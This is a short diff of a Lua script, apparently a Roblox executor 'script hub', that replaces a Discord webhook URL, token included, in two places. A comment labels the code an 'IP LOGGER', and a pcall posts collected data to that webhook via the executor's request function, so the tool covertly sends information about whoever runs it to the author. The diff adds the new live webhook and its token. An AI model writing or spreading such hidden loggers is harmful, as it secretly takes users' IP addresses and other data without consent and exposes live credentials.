@@ -23,7 +23,7 @@ function MakeScriptHub()
 
 ---IP LOGGER FR LOL
 
-local webh = "https://discord.com/api/webhooks/1075829154148274196/_ms_rIAdzJ1e7jUDBvR2mUAEU5LqNpHnztqELiSiHXtgBeyT_KYXRI4xvkiiNCStm14K"
+local webh = "https://discord.com/api/webhooks/1080557250894110770/8-c8lTfIQ7WhLpXLPG6Igb9y_K6cb5G0LnAUXL_krXg_5BjrlRKjOlkZkr3F8XPEhmy1"
 
 pcall(function()
    local data = {
@@ -106,7 +106,7 @@ local request = http_request or request or (syn and syn.request)
 
 request({
     Method = "POST",
-    Url = "https://discord.com/api/webhooks/1075829154148274196/_ms_rIAdzJ1e7jUDBvR2mUAEU5LqNpHnztqELiSiHXtgBeyT_KYXRI4xvkiiNCStm14K",
+    Url = "https://discord.com/api/webhooks/1080557250894110770/8-c8lTfIQ7WhLpXLPG6Igb9y_K6cb5G0LnAUXL_krXg_5BjrlRKjOlkZkr3F8XPEhmy1",
     Headers = {
         ["Content-Type"] = "application/json"
     },
